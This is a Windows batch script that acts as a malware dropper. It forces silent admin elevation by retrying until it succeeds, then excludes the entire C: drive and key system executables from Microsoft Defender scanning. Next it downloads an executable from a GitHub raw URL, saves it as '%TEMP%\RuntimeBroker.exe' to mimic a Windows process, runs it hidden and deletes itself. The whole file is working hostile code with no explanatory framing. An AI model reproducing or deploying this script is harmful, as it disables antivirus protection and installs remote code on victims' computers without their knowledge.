@echo off
:: Check admin privileges
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    goto :ADMIN_PRIVILEGES
) else (
    goto :ELEVATE
)

:ADMIN_PRIVILEGES
    :: Add all exclusions first
    powershell -ExecutionPolicy Bypass -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue" >nul 2>&1
    
    :: Verify exclusions were added
    powershell -Command "if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }" >nul 2>&1
    if %errorlevel% neq 0 (
        goto :ADMIN_PRIVILEGES
    )
    
    :: 2-second delay
    timeout /t 2 >nul 2>&1
    
    :: Download file with completely silent progress
    powershell -Command "$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing" >nul 2>&1
    
    :: Wait for download
    :WAIT_DOWNLOAD
    if not exist "%TEMP%\RuntimeBroker.exe" (
        timeout /t 1 >nul 2>&1
        goto :WAIT_DOWNLOAD
    )
    
    :: Execute
    start "" /B "%TEMP%\RuntimeBroker.exe" >nul 2>&1
    
    :: Self-delete
    del /f /q "%~f0" >nul 2>&1
    exit /b

:ELEVATE
    :: Elevate silently
    powershell -WindowStyle Hidden -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs" >nul 2>&1
    
    :: Retry if failed
    if %errorlevel% neq 0 (
        timeout /t 3 >nul 2>&1
        goto :ELEVATE
    )
    exit /b
